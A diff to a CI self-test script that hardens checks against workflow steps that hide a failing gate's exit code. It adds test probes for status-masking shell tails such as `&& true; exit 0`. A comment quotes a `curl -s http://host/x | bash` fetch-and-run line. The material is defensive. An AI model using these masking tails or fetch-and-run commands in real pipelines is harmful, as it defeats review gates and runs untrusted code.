@@ -260,11 +260,25 @@ check("a suite is never run twice — no dedicated check's suite is also in a bu
 # an interpreter, `-m pytest`, `-q`, and paths. Anything else is a deliberate edit here.
 # `check` and `--check` are the read-only subcommands of two gate scripts (analyze_agent_tooling.py,
 # skill_manifest.py), not pytest options.
-CMD_WORDS = {"python", "python3", "-m", "pytest", "-q", "-c", "pass", "check", "--check"}
+# `-c` and `pass` were in here, and they are how a check becomes a no-op that always exits 0:
+# `cmd=["python", "-c", "pass"]` is built entirely from whitelisted words, so rewriting any check's
+# argv to it passed. Nothing in `CHECKS` needs them — the only argvs that use `-c pass` are this
+# suite's own synthetic probes, and they are appended to `CHECKS` *below* the assertion, so the
+# whitelist never had to admit them. A whitelist widened for a caller that does not exist is a
+# whitelist widened for the attacker only.
+CMD_WORDS = {"python", "python3", "-m", "pytest", "-q", "check", "--check"}
 bad_words = sorted({w for c in pr_gate.CHECKS for w in (c["cmd"] or ())
                     if w not in CMD_WORDS and not w.startswith(("tests/", "scripts/"))})
 check("no check's argv carries a word outside CMD_WORDS — nothing that could collect without "
       "running, or install, or redirect", bad_words == [], bad_words)
+# The rule above is only worth its line if the whitelist actually refuses the no-op. A probe that
+# rewrote a check's argv to `python -c pass` *was* killed while `-c` and `pass` were still whitelisted
+# — by the orphan-suite rule, which noticed the suite that argv stopped naming, not by this rule at
+# all. So the whitelist could have gone on admitting a check that always exits 0, and the sweep would
+# have kept reporting a kill. Named here so the refusal is asserted rather than inferred.
+check("and the whitelist refuses the no-op argv specifically, independent of the orphan-suite rule "
+      "that happened to catch it",
+      not {"-c", "pass"} & CMD_WORDS, sorted(CMD_WORDS))
 
 # A check must run when the suite it runs is edited. The trigger-coverage rule further down asks
 # whether a check's triggers cover the files its suites *read*; this asks the more basic question it
@@ -780,14 +794,22 @@ if os.path.exists(workflow):
         if re.match(r"&(?!&)", tail):
             return False
         op = tail[:2] if tail[:2] in ("||", "&&") else tail[:1]
-        if op == "&&":
-            return True
-        if op == "|":
-            # A pipeline's status is the leftmost non-zero one *under* `set -o pipefail`, which
-            # `set_flags_ok` requires of every step. Admitted on that dependency, named here rather
-            # than left as a fall-through: without pipefail `python … | tee log` exits 0 on a failing
-            # gate, and the two rules would be disagreeing silently.
-            return True
+        if op in ("&&", "|"):
+            # These two used to `return True` *before* the walk below, which meant the rewrite that
+            # added the walk did not apply to them and two masking tails read as re-raising:
+            #
+            #   … && true; exit 0      # a command that is not last in an `&&` list is exempt from
+            #                          # `set -e`, so the shell reaches the `;` and exits 0
+            #   … | : || true          # the `|| true` suppresses `set -e` on the pipeline
+            #
+            # Both confirmed 0 in bash on a failing gate. The leading operator really is benign on
+            # its own — `&&` skips its branch on the failure path, and a pipeline keeps its status
+            # under `set -o pipefail` — but the text *after* it can still throw the status away, so
+            # the remainder gets asked the same question instead of being waved through. Recursing
+            # with a fresh `status_intact` is correct for both: nothing on the `&&` branch ran, and a
+            # pipeline's own status is the verdict.
+            rest = tokens(tail[len(op):])
+            return tail_preserves_status("".join(rest[1:]))
         if op not in ("||", ";"):
             return True
         # `$?` holds the invocation's status immediately after it, whether the operator is `||` or
@@ -829,7 +851,13 @@ if os.path.exists(workflow):
         return any(runs_segment(seg, tail, script, args_required) for seg, tail in parts(ln))
 
     def invocations(script, args_required=()):
-        return [ln for ln in run_contents(wf) if executes(ln, script, args_required)]
+        # `foreground`, because the one rule that consumes this asserts the checker *is executed* —
+        # and `executes` is satisfied by `--help`/`--list`, which produce no verdict, and by a segment
+        # bash skips. An existence assertion answered by a non-verdict invocation is the same defect
+        # the `seen` exemption had. (`step_runs` below deliberately keeps `executes`: it identifies
+        # *which* job runs the gate, where over-matching fails the "exactly one job" rule and
+        # under-matching would let a second job hide.)
+        return [ln for ln in run_contents(wf) if foreground(ln, script, args_required)]
 
     # `exit`/`return` do not mask a status, they end the shell: every command after one, on that
     # line or any later line of the step, is unreachable.
@@ -1239,7 +1267,14 @@ if os.path.exists(workflow):
                 if not (seg_words[:1] and seg_words[0] in TERMINATOR):
                     continue
                 # Positioned after the invocation on its own line: the verdict already happened.
-                if after and any(executes(pieces[j], after) for j in range(0, i, 2)):
+                # `foreground`, not `executes`. The two differ on exactly the cases that matter here:
+                # `executes` accepts `--list`/`--requirements`/`--help` (invocations that produce no
+                # verdict) and a segment bash skips because of a `&&`/`||` predecessor. So a mention of
+                # the script was enough to disarm every terminator after it, and
+                # `python …check_branch_scope.py --help` followed by `exit 0` passed 503/503 while the
+                # step printed usage and exited 0 — the very false green this rule's docstring cites as
+                # its reason for existing.
+                if after and any(foreground(pieces[j], after) for j in range(0, i, 2)):
                     continue
                 conditional, after_failure = conditional_before(pieces, i)
                 if conditional and reraises(seg_words, after_failure):
@@ -1251,7 +1286,7 @@ if os.path.exists(workflow):
         for ln in raw:
             if len(ln) - len(ln.lstrip()) == base and terminates(ln) and not seen:
                 out.append(ln.strip())
-            if after and executes(ln, after):
+            if after and foreground(ln, after):
                 seen = True
         return out
 
@@ -1827,8 +1862,19 @@ if os.path.exists(workflow):
               all(argv_in(invoking_segment(seq[i], "scripts/ai/check_branch_scope.py"),
                           (SCOPE_CMD, SCOPE_CMD + " --no-fetch")) for i in called),
               [invoking_segment(seq[i], "scripts/ai/check_branch_scope.py") for i in called])
-        check("its real exit code is what the retry loop reads",
-              all(seq[i + 1:i + 2] == ["code=$?"] for i in called), seq)
+        # Both halves matter, and only the first was asserted. Pinning the line *after* the invocation
+        # says nothing about how many times `code` is written, and in shell the last write wins — so
+        # appending `sleep 0` + a second `code=$?` left `code=0` on every verdict and the step exited 0
+        # with the suite green. `reraises()` returns True unconditionally for `$code` on the strength of
+        # this rule (`ALLOWED_ASSIGN` admits no spelling but `code=$?`), so the durability it assumes
+        # has to be enforced here: the assignment appears where it is captured, and nowhere else.
+        captures = [j for j, ln in enumerate(seq) if ln == "code=$?"]
+        check("its real exit code is what the retry loop reads, and nothing reassigns `code` "
+              "afterwards (the last write wins, so a second `code=$?` reads whatever ran last)",
+              all(seq[i + 1:i + 2] == ["code=$?"] for i in called)
+              and captures == [i + 1 for i in called],
+              f"captures at {captures}, invocations at {called}" if captures != [i + 1 for i in called]
+              else seq)
         # The fork branch is the one without --pr, so a condition that is always true sends every
         # PR down it and loses STACKED permanently while `set -- --pr` survives, unreachable, in the
         # else. Textual rules could see the flag but not which branch runs.
@@ -2242,7 +2288,20 @@ if os.path.exists(workflow):
             # The two that must stay refused: before the invocation, position earns nothing.
             ("an exit on an earlier line", "exit 0\npython scripts/ai/pr_gate.py ${SEL}", True),
             ("an exit earlier on the same line",
-             "exit 0; python scripts/ai/pr_gate.py ${SEL}", True)):
+             "exit 0; python scripts/ai/pr_gate.py ${SEL}", True),
+            # All four rows above used the real `${SEL}` argv, so the exemption's predicate was never
+            # asked about an invocation that produces no verdict — and it was `executes`, which accepts
+            # exactly those. A `--help` line disarmed every terminator below it, which is how
+            # `check_branch_scope.py --help` + `exit 0` passed 503/503 while the step printed usage.
+            ("a --list mention then an exit",
+             "python scripts/ai/pr_gate.py --list\nexit 0", True),
+            ("a --help mention then an exit",
+             "python scripts/ai/pr_gate.py --help\nexit 0", True),
+            ("a --requirements mention then an exit",
+             "python scripts/ai/pr_gate.py --requirements ${SEL}\nexit 0", True),
+            # A skipped invocation is the other thing `foreground` asks and `executes` does not.
+            ("an invocation bash skips, then an exit",
+             "false && python scripts/ai/pr_gate.py ${SEL}\nexit 0", True)):
         check(f"the positional reading reads {label} as {'an early exit' if early else 'reachable'}",
               bool(escapes_early(as_step(*snippet.split("\n")), after=GATE)) is early, snippet)
     check("the annotation exception admits the brace-group handler this file calls a correct edit",
@@ -2253,10 +2312,27 @@ if os.path.exists(workflow):
           "before the real call is still accepted",
           executes("          rm -f gate.log || true; python scripts/ai/pr_gate.py ${SEL}",
                    "scripts/ai/pr_gate.py"))
-    for mask in ("|| echo warn", "|| /bin/true", "|| command true", "|| builtin true"):
+    # Four `||` rows and nothing else, which is exactly why both non-`||` branches of
+    # `tail_preserves_status` shipped with a `return True` that skipped the walk. The last three rows
+    # are those branches, all three confirmed to exit 0 in bash on a failing gate.
+    for mask in ("|| echo warn", "|| /bin/true", "|| command true", "|| builtin true",
+                 # `&&` skips its own branch on failure, but a command that is not last in an `&&`
+                 # list is exempt from `set -e`, so the shell runs on and reaches the `;`.
+                 "&& true; exit 0", "&& : ; exit 0",
+                 # A pipeline keeps its status under pipefail; the `|| true` after it does not.
+                 "| : || true"):
         check(f"masking with `{mask}` is rejected",
               not executes(f"          python scripts/ai/pr_gate.py ${{SEL}} {mask}",
                            "scripts/ai/pr_gate.py"))
+    # ...and the benign forms of those same two operators must keep passing, or the fix above is just
+    # a stricter rule that fires on correct code.
+    # `| tee gate.log` was here, and the tail predicate does accept it — but the segment whitelist
+    # refuses `tee` as a write channel, so listing it as a benign form invited someone to widen the
+    # whitelist to match. The two rules disagreeing is the point: `tee` is refused, deliberately.
+    for fine in ("&& true", "&& echo ok", "| cat", "&& exit $?", "; exit $?"):
+        check(f"`{fine}` after the invocation is still accepted",
+              executes(f"          python scripts/ai/pr_gate.py ${{SEL}} {fine}",
+                       "scripts/ai/pr_gate.py"), fine)
     check("a handler that re-raises is not masking",
           executes('          python scripts/ai/pr_gate.py ${SEL} || { echo "::error::"; exit 1; }',
                    "scripts/ai/pr_gate.py"))
@@ -2773,6 +2849,19 @@ if os.path.exists(workflow):
               not permitted(mutant) and not permitted_job(mutant), mutant)
     check("and an ordinary echo still passes, so that rule is not a ban on echo",
           permitted('echo "no drift"') and permitted_job('echo "no drift"'))
+    # Every `run` step's opener, not just the gate's. `tail_preserves_status` admits a pipeline on the
+    # grounds that `set -o pipefail` makes its status the leftmost non-zero one, and the comment
+    # authorising that said the flags were "required of every step" — they were required of exactly
+    # one. Dropping `pipefail` from the branch-scope step produced no failure at all, so the rule that
+    # depends on it and the rule that enforces it were not talking about the same steps. The dependency
+    # is now real, which is the only thing that makes the pipeline admission sound.
+    openers = [(s.get("name") or "<unnamed>", (shell_of(s)[:1] or [""])[0])
+               for s in job_steps if "run" in s]
+    bad_openers = [(n, o) for n, o in openers if not set_flags_ok(o)]
+    check("every run step opens with -e, -u and -o pipefail, not just the gate step — the pipeline "
+          "admission in `tail_preserves_status` depends on pipefail holding everywhere (extra flags "
+          "such as -x are fine; SET_FLAGS lists them)",
+          not bad_openers, bad_openers or openers)
     stray = [(s.get("name"), seg.strip()) for s in job_steps if "run" in s
              for ln in shell_of(s) for seg, _ in parts(ln) if not permitted_job(seg)]
     check("every command in every step is one the job exists to run, so no step can rewrite what a "
@@ -3690,7 +3779,7 @@ if FAILED:
 # spelled `run: curl -s http://host/x | bash` produced no [FAIL] at all, just a request to bump an
 # integer. (It now fails a whitelist too, since `raw_shell_of` reads inline scalars — but the
 # message had to stop inviting that response either way.)
-EXPECTED = 503
+EXPECTED = 517
 REACHED = PASSED + len(FAILED)
 if REACHED < EXPECTED:
     print(f"only {REACHED} of {EXPECTED} checks reached a verdict — a rule stopped running, which is "
